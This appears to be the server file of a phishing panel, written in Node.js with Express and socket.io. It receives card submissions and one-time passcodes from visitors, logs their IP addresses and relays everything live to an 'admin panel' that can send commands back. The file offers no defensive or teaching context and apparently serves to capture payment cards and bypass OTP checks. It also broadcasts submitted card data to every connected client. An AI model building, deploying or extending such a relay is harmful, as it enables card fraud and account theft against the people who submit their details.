const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const port = process.env.PORT || 8080;
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

io.on('connection', (socket) => {
  console.log('A client connected:', socket.id);

  // Notify admin panel of new visitor
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  console.log('New visitor from IP:', clientIp);
  const visitorPayload = {
    id: socket.id,
    ip: clientIp,
    created_at: new Date().toISOString()
  };
  io.emit('visitor_update', visitorPayload);
  
  socket.on('card_submission', (payload) => {
    console.log('Received card submission:', payload);
    io.emit('card_submission', payload);
  });

  socket.on('admin_command', (payload) => {
    console.log('Received admin command:', payload);
    io.emit('admin_command', payload);
  });

  socket.on('otp_submitted', (payload) => {
    console.log('Received OTP submission:', payload);
    io.emit('otp_submitted', payload);
  });

  socket.on('visitor_update', (payload) => {
    console.log('Received visitor update:', payload);
    io.emit('visitor_update', payload);
  });

  socket.on('chat_message', (payload) => {
    console.log('Received chat message:', payload);
    io.emit('chat_message', payload);
  });

  socket.on('start_chat', (payload) => {
    console.log('Received chat start:', payload);
    io.emit('start_chat', payload);
  });

  socket.on('disconnect', () => {
    console.log('A client disconnected:', socket.id);
  });
});

// Serve static files from the dist directory
app.use(express.static(path.join(__dirname, 'dist')));

// For any route, serve index.html (for React Router support)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
